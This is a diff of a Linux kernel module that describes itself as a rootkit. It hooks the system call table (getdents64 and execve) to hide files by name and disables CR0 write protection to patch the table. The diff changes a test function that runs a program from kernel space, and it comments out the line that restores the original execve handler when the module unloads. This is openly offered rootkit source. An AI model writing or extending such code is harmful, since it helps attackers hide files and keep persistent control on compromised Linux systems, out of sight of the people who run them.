@@ -14,7 +14,7 @@ MODULE_DESCRIPTION("Rootkit main entry");
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
-static void test(void);
+static int test(void);
 // Kernel system call
 asmlinkage long (*kl_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long (*kl_execve)(const char __user *filename,
@@ -37,7 +37,7 @@ asmlinkage long hooked_execve(const char __user *filename,
 #define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
 asmlinkage unsigned long **syscall_table;
 
-static void test(void){
+static int test(void){
     char *argv[] = { "./test", NULL};
     printk("I am here in test\n");
     static char *envp[] = {
@@ -149,7 +149,7 @@ static void lkm_exit(void)
     // Recover the original system call setting
     DISABLE_WRITE_PROTECTION;
     syscall_table[__NR_getdents64] = (unsigned long *)kl_getdents64;
-    syscall_table[__NR_execve] = (unsigned long *)kl_execve;
+//    syscall_table[__NR_execve] = (unsigned long *)kl_execve;
     ENABLE_WRITE_PROTECTION;
 }
  
